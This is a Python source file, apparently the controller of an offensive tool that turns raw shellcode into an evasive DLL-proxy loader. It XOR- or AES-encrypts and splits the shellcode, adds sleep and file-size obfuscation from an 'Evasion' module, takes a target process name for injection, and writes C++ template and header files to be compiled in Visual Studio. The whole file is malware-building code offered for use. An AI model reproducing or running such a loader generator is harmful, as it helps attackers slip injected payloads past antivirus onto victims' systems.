import random
import os

from Dll_Names.Dlls import dll_names
from Encryption.Xor import DoXor,key,keyHex
from Templates.Split_Xor_Shellcode import split_xor_shellcode,split_aes_shellcode
from Templates.C_Template import template
from Templates.Arguments  import parse_arguments
from Templates.Shellcode import EncryptedShellcode
from Encryption.AES import encryptAES,keyAES,returnKey
from Evasion.Obfuscator import obfuscatorArray,obfuscatorSize


def Controller():
# Coordinates the overall functionality of the application
# Integrates functions from DLL names, encryption, shellcode processing, and evasion

    #DLL_EXPORTS FOLDER PATH
    folder_path="./Dll_Exports/"

    array_dll_names=dll_names()

    # read the shellcode from the file and then encrypt it
    # Also output folder will be specified & the name of the process which will be injected
    args = parse_arguments()
    try:
        plaintext = open(args.raw[0],"rb").read()
        output_folder = args.path
        process_to_inject = args.pname
        file_alias = args.dexports[0]
        if file_alias not in array_dll_names:
            print(f"Invalid file option. Available options: {', '.join(array_dll_names.keys())}\n")
            sys.exit(1)
        file_option = array_dll_names[file_alias]
        encryption_type =  args.enc[0]
        injection = args.inj
        shellcode_var =args.rshell
        xor_func = args.rxor
        key_var = args.rkey
        time = args.rsleep
        size = args.size
    except:
        parse_arguments()
        sys.exit()

    with open(os.path.join(folder_path, file_option), "r") as f:
        # Read the contents of the file
        file_contents = f.read()
    
    #Initialize random (30) numbers array
    timeArray = obfuscatorArray(time)
    #Initialze random filesizes
    sizeArray = obfuscatorSize(size)

    if encryption_type == "XOR":
        ciphertext = DoXor(plaintext, key)
        ciphertext_split = split_xor_shellcode(ciphertext)
        key_hex = keyHex(key)
        shellcode=EncryptedShellcode(shellcode_var, ciphertext_split)
        key_hex = f'''"{key_hex}"'''
        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,key_hex,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)

    elif encryption_type == "AES":
        ciphertext = encryptAES(plaintext,keyAES)
        ciphertext_split = split_aes_shellcode(ciphertext)
        keyAES2 = returnKey(keyAES)
        shellcode=EncryptedShellcode(shellcode_var, ciphertext_split)
        key_hex = f'''{{keyAES2}}'''
        c_template=template(file_contents,xor_func,shellcode_var,ciphertext_split,key_var,keyAES2,process_to_inject,time,injection,encryption_type,timeArray,sizeArray)
        
    # Create the output folder if it doesn't exist
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Generate output file path
    output_filename = os.path.join(output_folder, "main.cpp")
    output_code =os.path.join(output_folder, "code.h")
    # Write encoded shellcode to output file and copy the contents to the main file
    with open(output_filename, "w") as f:
        f.write(c_template)
    with open(output_code, "w") as f:
        f.write(shellcode)
    print("Create a new visual studio project and copy the files located at " + output_folder + " Folder \n")
    print("Template has been saved to: " + output_filename)
    print("Obfuscated code has been saved to: " + output_code)

